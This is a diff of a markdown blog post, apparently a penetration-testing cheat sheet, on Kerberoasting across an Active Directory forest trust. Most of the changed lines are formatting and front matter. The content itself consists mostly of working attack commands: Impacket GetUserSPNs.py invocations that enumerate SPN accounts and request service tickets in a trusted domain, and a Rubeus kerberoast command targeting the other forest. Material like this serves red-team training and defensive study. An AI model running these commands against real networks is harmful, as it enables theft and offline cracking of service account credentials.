@@ -1,21 +1,33 @@
 ---
-title: "Cross-Forest : Kerberoasting"
+title: 'Cross-Forest : Kerberoasting'
 date: 2025-12-03 02:54:40
+
 categories:
   - Active Directory
   - Exploitation
   - Cross Forest
   - Kerberoasting
+
 tags:
   - PowerView
   - Rubeus
+
+cover: /img/kerberoasting.png
+top_img: /img/bg-img.jpg
+description: Attacking Cross Forest Trust.
 ---
+
+
+
+
 
 # Linux
 
-> To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command.
+
+> To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command.
 
 ### Enumerate Users With SPN On The Target Domain
+
 
 ```bash
 GetUserSPNs.py -target-domain <CrossDomainName> domain/our-user
@@ -23,9 +35,12 @@ GetUserSPNs.py -target-domain <CrossDomainName> domain/our-user
 
 ### Request TGS
 
+
 ```bash
 GetUserSPNs.py -request -target-domain <CrossDomainName> domain/our-user
 ```
+
+
 
 # Windows
 
@@ -40,12 +55,18 @@ krbtgt
 mssqlsvc
 ```
 
-> ➜ We see that there is one account with an SPN in the target domain which is `mssqlsvc`.
+>➜  We see that there is one account with an SPN in the target domain which is `mssqlsvc`.
+
 
 ### Performing a Kerberoasting
 
-> ➜ It’s the same as normal kerberoasting but in this case we add `/domain` and specify the target domain.
+
+>➜ It's the same as normal kerberoasting but in this case we add `/domain` and specify the target domain.
 
 ```powershell
 PS C:\> .\Rubeus.exe kerberoast /domain:<CrossDomainName> /user:target-user /nowrap
 ```
+
+
+
+
